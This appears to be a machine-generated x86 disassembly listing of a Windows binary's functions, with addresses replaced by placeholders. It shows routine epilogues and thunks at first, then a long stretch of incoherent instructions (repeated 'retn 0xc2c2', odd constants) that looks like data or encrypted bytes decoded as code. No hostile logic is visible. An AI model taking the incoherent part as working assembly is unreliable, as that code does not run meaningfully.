pop ebp
retn
sub_45e137
inc [ ecx ]
add [ eax ] al
add [ esi ] ch
add [ eax ] al
add [ ecx + 0x52 ] dl
mov eax [ rw-data ]
mov eax [ eax ]
call eax
retn
sub_45e1da
jmp sub_403858
sub_45e1e1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_45e27a
jmp sub_403858
sub_45e281
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_45e306
jmp sub_403858
sub_45e30d
pop ecx
pop ebp
retn
sub_45e310
mov eax [ eax + 0x4 ]
retn
sub_45e36e
jmp sub_403858
sub_45e375
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_45e451
jmp sub_403858
sub_45e458
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45e499
jmp sub_403858
sub_45e4a0
pop ebp
retn
sub_45e4a4
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax [ rw-data ]
mov edx [ sub_45d3bc ]
mov [ eax ] edx
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
mov eax [ rw-data ]
mov [ eax ] sub_45df9c
sub_45e4f5
jmp sub_403858
sub_45e4fc
pop ebp
retn
sub_45e500
sub [ rw-data ] 0x1
retn
sub_45e634
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_40c1fc
pop esi
pop ebx
retn
sub_45e78b
jmp sub_403858
sub_45e792
pop ebx
pop ecx
pop ebp
retn
sub_45e861
jmp sub_403858
sub_45e868
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_45e9eb
jmp sub_403858
sub_45e9f2
pop ebp
retn
sub_45eac7
jmp sub_403858
sub_45eace
pop ecx
pop ebp
retn
sub_45ec04
pop ebp
retn
sub_45ec08
sub [ rw-data ] 0x1
retn
sub_45ef30
push esi
mov esi [ eax + 0x34 ]
test esi esi
je r-xdata
pop esi
retn
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x40 ]
sub_45ef44
mov edx [ eax + 0x34 ]
test edx edx
je r-xdata
retn
mov eax edx
mov edx [ eax ]
call [ edx + 0x44 ]
sub_45ef54
push esi
mov esi [ eax + 0x34 ]
test esi esi
je r-xdata
pop esi
retn
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x48 ]
sub_45ef68
push esi
mov esi [ eax + 0x34 ]
test esi esi
je r-xdata
pop esi
retn
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x4c ]
sub_45efa1
jmp sub_403858
sub_45efa8
pop ebp
retn
sub_45efac
sub [ rw-data ] 0x1
retn
sub_45efd9
jmp sub_403858
sub_45efe0
pop ebp
retn
sub_45efe4
sub [ rw-data ] 0x1
retn
sub_45f07b
pop ebp
retn
sub_45f080
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax sub_45efec
call sub_403c00
mov dl 0x1
mov eax [ r-xdata ]
call sub_4260d4
mov [ rw-data ] eax
sub_45f0cd
jmp sub_403858
sub_45f0d4
pop ebp
retn
sub_45f0d8
sub [ rw-data ] 0x1
retn
sub_45f284
jmp sub_403858
sub_45f28b
pop ebx
pop ecx
pop ebp
retn
sub_45f350
jmp sub_403858
sub_45f357
pop ebx
pop ecx
pop ebp
retn
sub_45f35c
mov dl [ eax + 0x63 ]
mov ecx [ eax ]
call [ ecx + 0x64 ]
retn
sub_45f368
retn
sub_45f4c7
jmp sub_403858
sub_45f4f6
jmp sub_403858
sub_45f4fd
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45f687
jmp sub_403858
sub_45f6b6
jmp sub_403858
sub_45f6bd
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_45f739
jmp sub_403858
sub_45f740
pop ebp
retn
sub_45f744
sub [ rw-data ] 0x1
retn
sub_45f958
push ebx
cmp [ eax + 0x72 ] 0x0
je r-xdata
pop ebx
retn
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x74 ]
call [ ebx + 0x70 ]
sub_45f970
push ebx
cmp [ eax + 0x7a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x7c ]
call [ ebx + 0x78 ]
sub_45f9ad
jmp sub_403858
sub_45f9b4
pop ebp
retn
sub_45f9b8
sub [ rw-data ] 0x1
retn
sub_45fb60
jmp sub_403858
sub_45fb67
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_45fbf4
jmp sub_403858
sub_45fbfb
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_45fc7f
jmp sub_403858
sub_45fc86
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_45fe81
jmp sub_403858
sub_45fe88
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_45feed
jmp sub_403858
sub_45fef4
pop ebp
retn
sub_45fef8
sub [ rw-data ] 0x1
retn
sub_4601ee
retn 0xc2c2
sub_4601f1
retn 0xc2c2
sub_4601f4
retn 0xc2c2
sub_460215
retn 0xc2c2
sub_460218
retn 0x4ad
sub_46021b
mov ebx 0x525273e4
retn 0xc2c2
sub_460224
retn 0x38c2
sub_460237
mov edi [ ebx + 0x52527554 ]
retn 0xc2c2
sub_460240
retn 0x7c2
sub_460243
mov ebx 0x525247d2
add ch [ ebp - 0x282085fc ]
0xbbadadaf 0x7499
push edx
push edx
retn 0xc2c2
sub_46025a
retn 0xc2c2
sub_46025d
retn 0xc2c2
sub_460260
retn 0x9bc2
sub_460267
retn 0xc2c2
sub_46026a
retn 0x17df
sub_46026d
mov edx 0x52621bbb
push edx
fldenv [ edx + 0x7849d65d ]
push edx
push edx
mov ebx 0x5252785b
retn 0x5dc2
sub_460283
salc
or dl [ 0x56bb5252 ]
dec esi
push edx
push edx
retn 0xc2c2
sub_460290
retn 0xd7c2
sub_460293
xchg edx eax
pop ebp
salc
push ecx
push edx
push edx
push edx
popad
xchg edx eax
adc cl [ 0xffffffff919b090c ]
retn 0xbc2
sub_4602a5
mov ebx 0x52527647
xlat
fwait
pop ebp
salc
inc ebx
push ecx
push edx
push edx
mov ebx 0x52526fe2
retn 0xc2c2
sub_4602ba
retn 0xd1c2
sub_4602bd
xchg esi eax
inc esi
xlat
xchg edx eax
mov ebx 0x5252006f
retn 0xc2c2
sub_4602c9
lodsd [ esi ]
daa
inc edx
mov ebx 0x52526c12
retn 0xc2c2
sub_4602d4
xor al 0xdb
pop ss
movsb [ edi ] [ esi ]
mov ebx 0x525248fb
retn 0xc2c2
sub_4602e0
retn 0xd7c2
sub_4602e3
lodsd [ esi ]
mov ebx 0x52526ba5
retn 0xc2c2
sub_4602ec
retn 0xd7df
sub_4602ef
xchg esi eax
scasb [ edi ]
lodsd [ esi ]
lodsd [ esi ]
add bh [ ebx + 0x52526963 ]
retn 0xc2c2
sub_4602fc
xor al 0xdb
psubd mmx1 [ ecx ]
xor al 0xdb
psubb mm3 mmx1
mov edi [ eax ]
xor [ ebx + ebx * 8 ] esi
paddd mmx1 [ ecx ]
xor al 0xdb
paddb mm7 [ ebx + 0x525265b2 ]
retn 0xc2c2
sub_46031a
retn 0xc2c2
sub_46031d
retn 0x38c2
sub_460320
push esi
cmp dl [ edx + 0x62 ]
push edx
push edx
mov ebx 0x525269dd
retn 0xc2c2
sub_46032e
fist [ edi ]
scasb [ edi ]
add al [ ecx ]
add [ ebx + 0x525267a2 ] edi
retn 0xd7c2
sub_46033c
xchg edx eax
pop ebp
salc
sub edx [ edx + edx * 2 ]
push edx
fld [ esi ]
jbe r-xdata
rcl [ eax + 0x76d6df56 ] 0x1
retn 0x5252
sub_46037c
mov ebx 0xc2525267
retn 0x94d9
sub_4603a2
retn 0xc2c2
sub_4603a5
or [ ebx + 0x52526718 ] bh
retn 0xc2c2
sub_4603ae
retn 0xc2c2
sub_4603b1
retn 0xc2c2
sub_4603b4
xor al 0xdb
pop es
pushad
cmp [ esi ] dh
or [ ebx + ebx * 8 ] dh
pop es
cmp [ eax ] dh
mov ebx 0x5252195c
retn 0x17df
sub_4603c9
mov ebx 0x5252704f
retn 0xc2c2
sub_4603d2
retn 0x2c2
sub_4603f4
retn 0xc2c2
sub_4603f7
retn 0x401
sub_46040b
retn 0xc2c2
sub_46040e
retn 0xd134
sub_460411
push 0xc8d65d52
dec eax
push edx
push edx
mov ebx 0x525246b7
retn 0xc2c2
sub_460421
retn 0xc2c2
sub_460424
retn 0xdb05
sub_460427
adc al 0x32
mov edx 0x52526cb7
cmp ch [ esi ]
add esi [ 0xffffffff80bb0538 ]
pop ds
push edx
push edx
retn 0xc2c2
sub_46043c
retn 0x9261
sub_46043f
mov ebx 0x52521408
retn 0x6b34
sub_460447
inc bx
mov ebx 0x52527e3b
retn 0xd7c2
sub_460452
mov ebx 0x52526f85
retn 0xd9c2
sub_46045a
0x52525292 0x1ed9
sub_460493
mov ebx 0x5252504b
retn 0xc2c2
sub_46049b
lodsd [ esi ]
lds edi [ edx - 0x2eadadae ]
xchg esi eax
add bl bh
pop ss
xchg edx eax
add bh [ ebx + 0x525256da ]
retn 0xc2c2
sub_4604b0
retn 0xc2c2
sub_46051a
retn 0x2c2
sub_46051d
lodsd [ esi ]
and [ edx ] ecx
fst [ ebp + eax + 0x526793bb ]
push edx
retn 0xc2c2
sub_46052b
retn 0xc2c2
sub_46052e
retn 0xc2c2
sub_460531
retn 0xc2c2
sub_460534
xor al 0xdb
das
in al 0xbb
movsb [ edi ] [ esi ]
pop edi
push edx
push edx
retn 0x35bb
sub_460540
scasd [ edi ]
lodsd [ esi ]
lodsd [ esi ]
retn 0xc2c2
sub_460546
retn 0xc2c2
sub_460549
retn 0x9c2
sub_46054c
mov ebx 0x52527e19
retn 0xc2c2
sub_460554
retn 0x38c2
sub_460586
retn 0x69c2
sub_4605b2
pop esi
fstp [ edi ]
pop edx
mov ebx 0x525258a3
pop ebp
shr [ ebx + ebx * 2 + 0xc0d5252 ] 0x1
xchg ecx eax
retn 0xc2c2
sub_4605c7
retn 0xc2c2
sub_4605ca
pop es
fnstcw [ esi + 0x3862bed1 ]
xor [ edx ] cl
cmp [ esi ] dh
xor al 0xdb
pop ss
mov edx 0x3433380a
fist [ edi ]
mov eax 0x527514bb
push edx
retn 0xc2c2
sub_4605e8
retn 0x6934
sub_4605eb
adc al 0x54
mov ebx 0x52526e95
retn 0x34c2
sub_4605f5
fistp [ edi ]
mov edx 0xbb35380b
lodsb [ esi ]
dec ebp
push edx
push edx
retn 0xc2c2
sub_460603
retn 0xc2c2
sub_460606
retn 0xd7df
sub_460673
mov esi 0xbb010303
iretd
sub_460679
inc esp
push edx
push edx
retn 0xc2c2
sub_46067f
retn 0xc2c2
sub_460682
retn 0xc2c2
sub_460685
retn 0x2c2
sub_460688
fst [ ebx + edi * 4 + 0x5252643b ]
retn 0xc2c2
sub_460692
retn 0xba04
sub_460696
bound edx [ edx + 0x52 ]
rcl [ esi + 0x5bd4bb5e ] 0x1
push edx
push edx
retn 0xc2c2
sub_4606a4
retn 0x38c2
sub_4606a7
dec esp
cmp [ ebp + 0x527afbbb ] ch
push edx
retn 0xd9c2
sub_4606b2
mov esi 0xd3aab6d1
mov esi 0x525256c6
add [ ebx + edi * 4 ] eax
push ecx
jno r-xdata
mov edx 0x52525a37
add bl bh
push edx
retn 0xbc2
sub_4606c6
xlat
xchg edx eax
pop ebp
xlat
in eax 0x79
push edx
push edx
fist [ edi ]
stosb [ edi ]
add bh [ ebx + 0x525279cc ]
retn 0xc2c2
sub_4606da
retn 0xc2c2
sub_4606dd
retn 0x56ed
sub_46071c
out 0xaa al
lodsd [ esi ]
lodsd [ esi ]
mov edx 0x5252405a
mov ebx 0x52521be8
retn 0xc2c2
sub_46072d
retn 0xc2c2
sub_460730
retn 0xc2c2
sub_460733
retn 0xc2c2
sub_460736
pop es
fnstcw [ esi + 0x61050103 ]
lodsd [ esi ]
add eax 0x5503805
cmp [ eax + 0x3a ] dl
push edx
push edx
push edx
adc ch [ ebp + 0x4ad5a27 ]
push 0xffffffd9
mov bh [ ebx + 0x5252654b ]
retn 0x9534
sub_460786
mov bh [ ebx + 0x52524f05 ]
retn 0xc2c2
sub_46078f
retn 0x212
sub_460792
mov ebx 0x52524204
retn 0xc2c2
sub_4607b3
xlat
mov [ edx + 0x52 ] ebx
push edx
popad
xchg edx eax
mov ebx 0xadadaf16
retn 0xc2c2
sub_4607c2
retn 0xc2c2
sub_4607c5
retn 0xc2c2
sub_4607c8
retn 0x38c2
sub_4607cb
and dh [ ebx + ebx * 8 ]
pop ss
mov al [ 0x18d9bb0a ]
push edx
push edx
add dl [ edi + edx - 0x6745ad53 ]
adc dl [ edx + 0x52 ]
mov ebx 0x52525017
retn 0xc2c2
sub_4607e8
retn 0xc2c2
sub_4607ed
retn 0xc2c2
sub_4607ee
retn 0xc2c2
sub_4607f1
retn 0xc2c2
sub_4607f4
retn 0x8ad9
sub_460800
mov edx 0xe7bb88d9
pop edx
push edx
push edx
fst [ edi ]
cmpsb [ esi ] [ edi ]
fist [ edi ]
mov esi 0x80619261
mov ebx 0x5252448b
retn 0xdb34
sub_46081a
pop ss
mov [ 0xffffffffadfabb0a ] al
lodsd [ esi ]
lodsd [ esi ]
retn 0xc2c2
sub_460825
fst [ edx + edi * 4 - 0x52525662 ]
or edi [ ebx - 0x525257ce ]
retn 0x911a
sub_460835
retn 0xc2c2
sub_460838
retn 0xd9c2
sub_46083c
mov ebx 0x52525f31
retn 0x61c2
sub_460844
xchg edx eax
or al 0xbb
int3
sub_46086b
retn 0x26ad
sub_460870
lodsd [ esi ]
lodsd [ fs : esi ]
lds ebp [ esi - 0x52adadae ]
lodsd [ fs : esi ]
lds esp [ esi - 0x6eadadae ]
retn 0xc2c2
sub_460884
retn 0xc2c2
sub_460887
retn 0xc2c2
sub_46088a
retn 0xdb34
sub_46088d
pop ss
mov edx 0xdb349261
pop ss
mov eax 0x525f08bb
push edx
retn 0xc2c2
sub_46089d
retn 0x9261
sub_4608a0
xor al 0xdb
pop ss
test al 0xdf
xlat
xchg [ edi + 0x62baadad ] ch
pop eax
push edx
push edx
mov ebx 0x52521464
retn 0xc2c2
sub_4608b7
retn 0xc2c2
sub_4608ba
fst [ edi ]
pop edx
mov edx 0xadada964
mov ebx 0x52524ae3
retn 0x17d9
sub_4608ca
pop edx
cmp [ edx - 0x45 ] dl
retn 0x5268
sub_4608d1
push edx
retn 0x3ba
sub_4608d5
push ss
push edx
push edx
mov ebx 0x525274ae
retn 0x7c2
sub_4608e0
fnstcw [ esi + 0x514abed3 ]
push edx
push edx
add [ ecx ] eax
mov [ 0x525ed2bb ] eax
push edx
retn 0xc2c2
sub_4608f5
retn 0xc2c2
sub_4608f8
retn 0xdb34
sub_46092d
cmpsb [ esi ] [ edi ]
mov ebx 0x525277b5
retn 0x38c2
sub_46097a
mov esi 0x5b06bed3
push edx
push edx
add [ eax + 0x1bba2d9 ] eax
scasd [ edi ]
lodsd [ esi ]
lodsd [ esi ]
retn 0xc2c2
sub_46098e
xor al 0xdb
pop es
or al 0x8
cmp [ esi ] dh
mov ebx 0x52527cb7
retn 0xd9c2
sub_46099e
xlat
lodsd [ esi ]
mov ebx 0x5252567a
retn 0xc2c2
sub_4609a8
retn 0xc2c2
sub_4609ab
retn 0xbb02
sub_4609d3
lds edi [ edx - 0x44adadae ]
pop esi
push edx
push edx
retn 0xc2c2
sub_4609e0
retn 0xc2c2
sub_4609e3
retn 0xc2c2
sub_4609e6
retn 0x93d9
sub_4609e9
xor al 0xdb
pop ss
mov bh [ ebx + 0x52525770 ]
retn 0xc2c2
sub_4609f5
retn 0xc2c2
sub_4609f8
retn 0x17d9
sub_4609fb
inc edx
mov ebx 0x52526e93
retn 0xc2c2
sub_460a04
retn 0xc2c2
sub_460a07
retn 0x34c2
sub_460a2c
sbb eax [ ecx + 0x52 ]
push edx
retn 0xc2c2
sub_460a33
retn 0xbb07
sub_460a38
push edx
push edx
retn 0xb393
sub_460a3d
push edi
fldcw [ ebx + edx * 4 + 0x6abb50bd ]
inc esi
push edx
push edx
retn 0xc2c2
sub_460a4b
retn 0xc2c2
sub_460a4e
retn 0xc2c2
sub_460a51
add ch [ ebp - 0x6044a5d9 ]
insd
push edx
push edx
retn 0x2e6b
sub_460aaa
mov esi 0xaad90503
lodsd [ esi ]
vrsqrtss xmm2 xmm0 [ edx + 0x52 ]
mov ebx 0x52524eb2
retn 0x1a10
sub_460abd
pop ebp
xlat
js r-xdata
jbe r-xdata
push edx
push edx
or eax 0x910c94d9
retn 0xc2c2
mov ebx 0xadada541
retn 0xc2c2
mov ebx 0x52524a76
retn 0xc2c2
sub_460acb
retn 0xc2c2
sub_460ace
retn 0xd9c2
sub_460b00
imul ecx [ esi ] 0x76
inc esi
mov ebx 0x52524a76
retn 0xc2c2
sub_460b0c
retn 0xc2c2
sub_460b0f
retn 0x96d1
sub_460b2a
scasb [ edi ]
push edx
push edx
push edx
push edx
mov ebx 0x525268d7
retn 0xd9c2
sub_460b37
or dh [ esi - 0x45 ]
pushfd
scasd [ edi ]
lodsd [ esi ]
lodsd [ esi ]
retn 0xadc2
sub_460b41
daa
scasb [ edi ]
mov ebx 0x52526f81
retn 0xbb09
sub_460b52
retn 0xc2c2
sub_460b55
fst [ ebx + 0x524ce6bb ]
push edx
retn 0xdb34
sub_460b5f
pop ss
scasb [ edi ]
mov ebx 0x52525af7
retn 0xc2c2
sub_460b69
retn 0x34c2
sub_460bbf
retn 0xc2c2
sub_460bc2
retn 0xc2c2
sub_460bc5
retn 0xc2c2
sub_460bc8
retn 0xc2c2
sub_460bcb
retn 0xfdb
sub_460bce
mov esi 0x526d22ba
push edx
mov ebx 0x52526dab
retn 0xbb02
sub_460bdc
mov ecx 0xc252527d
retn 0xc2c2
sub_460be4
retn 0xc2c2
sub_460be7
retn 0xc2c2
sub_460bea
mov ebx 0xadadaa1c
retn 0xc2c2
sub_460bf2
retn 0xc2c2
sub_460bf5
retn 0x1238
sub_460bf8
mov ebx 0x5252459d
retn 0xc2c2
sub_460c00
retn 0xc2c2
sub_460c03
retn 0xc2c2
sub_460c06
retn 0xc2c2
sub_460c28
xor al 0xdb
addps xmm3 xmm1
mov dh [ ebx + ebx * 8 ]
divps xmm3 xmm1
mov esi [ ebx + ebx * 8 ]
subps xmm3 xmm1
mov dh [ ebx + ebx * 8 ]
cmovb edi [ ebx + 0x525264d7 ]
retn 0xc2c2
sub_460c46
retn 0xc2c2
sub_460c49
retn 0xa2d9
sub_460c4c
mov ebx 0xadadab57
retn 0xbb04
sub_460c54
scasb [ edi ]
outsd
push edx
push edx
retn 0xd1c2
sub_460c5b
xchg ebx eax
inc esi
mov ebx 0x52526ae1
pop ebp
salc
pop ebp
adc [ edx + 0x52 ] dl
mov ebx 0x52526c31
fwait
xchg ecx eax
retn 0xc2c2
sub_460c72
retn 0xc2c2
sub_460c75
retn 0xc2c2
sub_460c78
retn 0x2c2
sub_460c7b
mov ebx 0x5252621d
retn 0xc2c2
sub_460c83
retn 0x5dc2
sub_460c86
xlat
fsub [ edx + 0x52 ]
push edx
popad
xchg edx eax
xchg ecx eax
retn 0xc2c2
sub_460c91
retn 0xc2c2
sub_460c94
retn 0xc2c2
sub_460c97
retn 0xc2c2
sub_460c9a
add [ 0x525f46bb ] eax
push edx
fst [ edi ]
inc edx
fisttp [ edx + 0x1 ]
mov ebx 0x52525faf
retn 0xc2c2
sub_460caf
retn 0xdb34
sub_460d02
rcl [ esi + 0x63ccba5e ] 0x1
push edx
push edx
imul edx [ ebp + 0x5383d65d ] 0x36d15252
jbe r-xdata
retn 0x16ad
push edx
mov ebx 0x52527c68
retn 0xc2c2
sub_460d93
retn 0xadc2
sub_460d99
fst [ esi ]
jbe r-xdata
push edx
push edx
mov ebx 0xadadacfd
lodsd [ esi ]
mov ebx 0xadada5b4
retn 0xc2c2
sub_460df4
loop r-xdata
or [ ebx - 0x3d3d3d6f ] ebx
retn 0xc2c2
push edx
push edx
mov ebx 0x52524794
fstp st7
fisubr [ edi - 0x6a445253 ]
imul edx [ edx + 0x52 ] 0xc2c2c2c2
retn 0xc2c2
sub_460e0f
retn 0xc2c2
sub_460e12
retn 0x11bb
sub_460e17
push edx
retn 0xc2c2
sub_460e1b
retn 0xd7c2
sub_460e1e
xchg edx eax
pop ebp
xlat
and [ ebp + 0x52 ] dl
push edx
fild [ edi ]
mov edx 0x524d1cbb
push edx
retn 0xbac2
sub_460e30
lea esp [ esi + 0x52 ]
push edx
mov ebx 0x52525a70
retn 0xc2c2
sub_460e3c
retn 0x8aa5
sub_460e40
xchg ecx eax
retn 0xc2c2
sub_460e44
retn 0xc2c2
sub_460e47
or eax 0xc2919b09
retn 0xc2c2
sub_460e51
retn 0xa2d9
sub_460e52
fldenv [ edx - 0x75445e97 ]
lodsb [ esi ]
lodsd [ esi ]
lodsd [ esi ]
cmp [ ebp - 0x44afc7fe ] ch
mov ch 0x11
push edx
push edx
retn 0xc2c2
sub_460e68
retn 0xedba
sub_460ee0
push edx
push edx
push edx
or eax 0x52462cbb
push edx
pop es
mov ebx 0xadada8d8
xor al 0xdb
pmulhuw mm6 [ ebx + ebx * 8 ]
pop ss
cmp [ ebx + 0x52525039 ] 0xc2
retn 0x27d9
sub_460f00
pop edx
fcom [ ebx + edi * 4 + 0x41 ]
imul edx [ edx + 0x52 ] 0x34
fist [ edi ]
inc esp
fst [ eax + 0x524185bb ]
push edx
retn 0x380a
sub_460f21
outsd
push edx
push edx
or al 0x91
retn 0xc2c2
sub_460f29
retn 0x3ac2
sub_460f7f
shr [ edx + 0x52 ] 0x1
add al 0xbb
mov ecx 0xc2adada0
retn 0xc2c2
sub_460f8c
retn 0xadc2
sub_460fb3
inc esi
add bh [ ebx + 0x52526c03 ]
retn 0xc2c2
sub_460fbd
retn 0x5d05
sub_460fc0
in eax 0x46
and ebx edi
sub ch ch
shr [ ebp + 0x5bc2bb4b ] 0x1
push edx
push edx
retn 0xc2c2
sub_460fd1
sar [ esi - 0x6d9efef2 ] 0x1
add al 0x5
fist [ edi ]
scasb [ edi ]
fist [ edi ]
cmpsb [ esi ] [ edi ]
mov ebx 0x5252587a
retn 0xc2c2
sub_460fe7
retn 0xc2c2
sub_460fea
retn 0xdb34
sub_460fed
pop es
mov ah 0x34
fistp [ edi ]
mov [ 0xffffffffada401bb ] al
lodsd [ esi ]
retn 0xc2c2
sub_461019
xchg edx eax
mov ebx 0x525251dd
adc [ ebx + 0x52521767 ] bh
retn 0x4c2
sub_461045
retn 0x910f
sub_461048
popad
xchg edx eax
adc cl [ 0xffffffffe55d919b ]
pop edx
mov ebx 0x52527086
retn 0x5dc2
sub_461083
retn 0x34c2
sub_461086
fld [ edi ]
xchg edx eax
mov ebx 0x5252782e
retn 0xc2c2
sub_461091
retn 0xbbc2
sub_461094
loopne r-xdata

push edx
push edx
retn 0xc2c2
sub_46109b
retn 0xc2c2
sub_46109e
retn 0xc2c2
sub_4610a5
or bh [ ebx + 0x52524def ]
retn 0x27df
sub_4610ae
inc edx
mov edx 0x52525ff8
or edi [ ebx + 0x5252620f ]
retn 0xc2c2
sub_4610bd
xor al 0xdb
movsx ebx cl
mov esi [ ebx + ebx * 8 ]
bsf ecx [ ecx ]
xor al 0xdb
cpuid
cmp [ edi ] ah
or [ ebx + ebx * 8 ] esi
push fs
cmp [ ebx ] bh
mov ebx 0x5252519e
retn 0x93d1
sub_4610dd
push eax
mov ebx 0x52527193
lodsd [ esi ]
add al 0x12
mov ebx 0x52526541
retn 0x5dc2
sub_461112
mov ebx 0x5252126e
pop ebp
in eax 0x43
mov ebx 0x525265fb
fist [ edi ]
mov esi 0xf1bb0502
test al 0xad
lodsd [ esi ]
retn 0xc2c2
sub_46112c
retn 0xc2c2
sub_46112f
retn 0xc2c2
sub_461132
retn 0xc2c2
sub_461135
retn 0xc2c2
sub_461138
retn 0xc2c2
sub_46113b
retn 0xc2c2
sub_46113e
retn 0xc2c2
sub_461141
retn 0xc2c2
sub_461144
retn 0xc2c2
sub_461147
retn 0xc2c2
sub_46114a
retn 0xc2c2
sub_46114d
retn 0xc2c2
sub_461150
retn 0xc2c2
sub_461153
retn 0xc2c2
sub_461156
retn 0xbed9
sub_461159
mov ebx 0xadadac21
retn 0xc2c2
sub_461161
retn 0xc2c2
sub_461164
retn 0xc2c2
sub_46116c
xor al 0xdb
daa
pushfd
mov ebx 0xadadab09
retn 0x34c2
sub_461178
fist [ edi ]
mov eax 0x524612bb
push edx
retn 0xc2c2
sub_4611cd
bound ebx [ es : esi - 0x6c ]
push ss
bound eax [ edx - 0x6f ]
popad
xchg edx eax
add al [ edx ]
add al [ edx ]
add [ ebx + 0x52524b1d ] edi
retn 0xc2c2
sub_4611e4
retn 0xc2c2
sub_4611ea
push es
mov [ 0x610badad ] al
xchg edx eax
mov ebx 0x52527530
retn 0xc2c2
sub_461288
mov dl bh
mov [ ebp - 0x2a ] ebx
inc esi
stosd [ edi ]
lodsd [ esi ]
lodsd [ esi ]
cmp bh [ ebp + 0xb ]
mov bh 0xcc
add ebx ebx
int3
sub_4612dd
retn 0x5dc2
sub_4612e0
in eax 0x43
mov ebx 0x5252456b
retn 0xd907
sub_4612ea
mov esi 0x5278f4bb
push edx
retn 0x5ad
sub_4612f3
mov ebx 0x52526e00
retn 0xc2c2
sub_4612fc
retn 0xc2c2
sub_4612ff
retn 0xc2c2
sub_461302
pop ebp
salc
sub [ ecx + 0x2ed1adad ] 0x5d527676
salc
0x5dadada9 0x11e4
push 0x2
pop ebp
in al 0x11
dec esp
mov ebx 0xadada3a9
retn 0xdb34
sub_461324
pop es
int3
sub_461332
retn 0x1f38
sub_461335
or eax 0xea2fdb34
fldcw [ eax - 0x17d024cc ]
cmp [ edi ] ah
or eax 0xee2fdb34
fldcw [ esp + esi - 0x2613d025 ]
test eax 0xadaf63bb
lodsd [ esi ]
retn 0x38c2
sub_461357
push cs
fst [ esp + esi + 0xaa417db ]
mov ebx 0x52526d0d
retn 0xe0ba
sub_461367
pop edx
push edx
push edx
mov ebx 0xadadbd1f
retn 0x7c2
sub_461372
mov ebx 0xadada560
retn 0xeeba
sub_46137a
pop eax
push edx
push edx
mov ebx 0x52526a76
retn 0xbac2
sub_461387
push edx
push edx
mov ebx 0xadada650
pop es
fnstcw [ esi + 0x15ebed1 ]
add eax 0x527373bb
push edx
retn 0x103
sub_46139e
add al 0x5
mov ebx 0xadadaaf7
retn 0xc2c2
sub_4613ab
retn 0xc2c2
sub_4613e5
xchg esi eax
pop esi
mov ebx 0x525263a9
retn 0x61c2
sub_4613ef
xchg edx eax
cmp [ esi ] ah
xor al 0xdb
pop es
[ ebx + ebx * 8 ] dh
pop ds
hlt
sub_461403
retn 0xc2c2
sub_461406
retn 0xc2c2
sub_461409
retn 0x34c2
sub_46140c
fistp [ edi ]
movsb [ edi ] [ esi ]
or ebx edi
pop ss
mov dh 0x2
fst [ edi ]
pop edx
xor al 0xdb
pop ds
stosb [ edi ]
mov ebx 0x525259f6
retn 0xc2c2
sub_461423
retn 0x9261
sub_461426
adc bl [ ebx - 0x3d3d3d6f ]
retn 0xbbc2
sub_461431
push edx
push edx
add al [ esp + eax ]
cmp [ edx + 0x4 ] dh
mov ebx 0x52525409
retn 0xc2c2
sub_461441
retn 0xc2c2
sub_461444
retn 0xa4d7
sub_461447
pop ebp
salc
nop
popad
push edx
push edx
cmp bh [ edi + 0x4c431a9 ]
mov ebx 0x52525f58
retn 0xc2c2
sub_461497
fistp [ edi ]
mov dh 0xd9
pop ss
mov dh 0x93
stosb [ edi ]
dec ebp
mov ebx 0x52526fc1
retn 0x3409
sub_4614ac
lea esi [ ebx + ebx * 8 ]
shld ecx ebx 0x8a
xor al 0xdb
rsm
sub_4614be
mov dh [ ebx + ebx * 8 ]
clflush [ ebx + 0x5252544a ]
retn 0xc2c2
sub_4614cb
retn 0xc2c2
sub_4614ce
retn 0xbbc2
sub_4614d1
and [ ecx + 0x52 ] cl
push edx
retn 0xc2c2
sub_4614d8
retn 0xbac2
sub_4614db
dec ebx
mov ebp 0xd70badad
xchg edx eax
mov ebx 0x52525c68
retn 0xc2c2
sub_4614ea
retn 0xc2c2
sub_4614ed
retn 0x34c2
sub_46151f
retn 0xcdf
sub_461560
retn 0xc2c2
sub_461563
retn 0xd65d
sub_461566
mov ah 0x75
push edx
push edx
mov ebx 0x52526be1
retn 0xc2c2
sub_461572
fldcw [ edx - 0x50412821 ]
lodsd [ esi ]
lodsd [ esi ]
push 0xf
inc edx
pop ebp
xlat
test eax 0x2adada7
add [ ebx + 0x525271ed ] edi
retn 0xc2c2
sub_46158d
retn 0xd7c2
sub_4615e3
retn 0xc2c2
sub_4615e6
retn 0xc2ad
sub_461612
retn 0x17df
sub_461637
retn 0x3538
sub_46164e
retn 0xd9c2
sub_46167c
retn 0x9bd7
sub_4616a1
retn 0xd65d
sub_4616a4
imul edx [ edx + 0x52 ] 0x5
mov ebx 0x52527dcb
retn 0xc2c2
sub_4616b1
retn 0xd7df
sub_4616b4
xchg [ edi - 0x45fd5253 ] ch
sub ah [ edx - 0x692e5253 ]
inc edx
fwait
xchg ecx eax
retn 0x85d9
sub_4616d1
sub bh [ edx + 0x52527e6e ]
cmp ch [ edx + 0x65 ]
insb
cmpsb [ esi ] [ edi ]
add eax 0x527920bb
push edx
retn 0xc2c2
sub_4616e5
retn 0xc2c2
sub_4616e8
retn 0xc2c2
sub_4616eb
retn 0xc2c2
sub_461707
retn 0xc2c2
sub_46170a
retn 0xc2c2
sub_46170d
retn 0x96d1
sub_461731
push edx
push edx
push edx
cmp [ edx ] dl
0x52524252 0x523a
sub_461778
retn 0x79c2
sub_46177b
mov al [ 0xffffffffbb58e55d ]
